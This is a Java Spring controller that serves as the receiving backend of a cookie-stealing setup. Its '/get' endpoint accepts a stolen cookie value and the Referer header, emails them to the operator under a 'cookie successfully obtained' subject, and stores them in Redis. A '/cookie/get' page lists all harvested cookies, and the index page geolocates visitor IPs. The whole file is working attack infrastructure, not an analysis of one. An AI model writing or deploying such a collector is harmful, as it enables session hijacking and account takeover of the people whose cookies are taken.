package com.jcod3r.controller;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpServletRequest;

import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.Resource;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.CollectionUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import redis.clients.jedis.Jedis;

import com.alibaba.fastjson.JSON;
import com.jcod3r.entity.CookieEntity;
import com.jcod3r.utils.EmailUtil;
import com.jcod3r.utils.IP;
import com.jcod3r.utils.RedisUtil;

@Controller
public class IndexController {

    @RequestMapping("/index.html")
    public String index(Model model, HttpServletRequest request)
            throws IOException {
        // 由于使用了Nginx，所以不能简单使用request.getRemoteAddr();获得客户端IP
        String ip = request.getHeader("CF-Connecting-IP");
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("x-forwarded-for");
        }
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("Proxy-Client-IP");
        }
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("WL-Proxy-Client-IP");
        }
        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getRemoteAddr();
        }

        Resource resource = new ClassPathResource("17monipdb.dat");
        IP.load(resource.getFile().getAbsolutePath());
        String[] ipAddr = IP.find(ip);

        System.out.println("IP-INFO: " + Arrays.toString(ipAddr));

        model.addAttribute("country",
            ArrayUtils.isEmpty(ipAddr) ? StringUtils.EMPTY : ipAddr[0]);
        model.addAttribute("city",
            ArrayUtils.isEmpty(ipAddr) ? StringUtils.EMPTY : ipAddr[1]);

        return "index";
    }

    @ResponseBody
    @RequestMapping({ "/get" })
    public void handleCookie(@RequestParam String c, HttpServletRequest request) {
        String referer = request.getHeader("Referer");

        CookieEntity entity = new CookieEntity();
        entity.setRefererUrl(referer);
        entity.setCookie(c);
        entity.setCreateTime(new Date());
        try {
            EmailUtil.sendSimpleEmail("成功获取Cookie", JSON.toJSONString(entity));
        } catch (Exception e) {
            e.printStackTrace();
        }

        List<CookieEntity> cookies = null;
        @SuppressWarnings("resource")
        Jedis jedis = RedisUtil.getJedis();

        String cookie = jedis.get("cookies");
        if (StringUtils.isBlank(cookie)) {
            cookies = new ArrayList<>();
        } else {
            cookies = JSON.parseArray(cookie, CookieEntity.class);
        }
        cookies.add(entity);

        jedis.set("cookies", JSON.toJSONString(cookies));

        RedisUtil.returnResource(jedis);
    }

    @SuppressWarnings("resource")
    @RequestMapping({ "/cookie/get" })
    public String getCookie(Model model) {
        List<CookieEntity> cookies = null;
        Jedis jedis = RedisUtil.getJedis();

        String cookie = jedis.get("cookies");
        if (!StringUtils.isBlank(cookie)) {
            cookies = JSON.parseArray(cookie, CookieEntity.class);
        }

        RedisUtil.returnResource(jedis);

        if (!CollectionUtils.isEmpty(cookies)) {
            Collections.sort(cookies, new Comparator<CookieEntity>() {
                @Override
                public int compare(CookieEntity arg1, CookieEntity arg0) {
                    return arg1.getCreateTime().compareTo(arg0.getCreateTime());
                }
            });
        }

        model.addAttribute("cookies", cookies);

        return "cookie";
    }

}
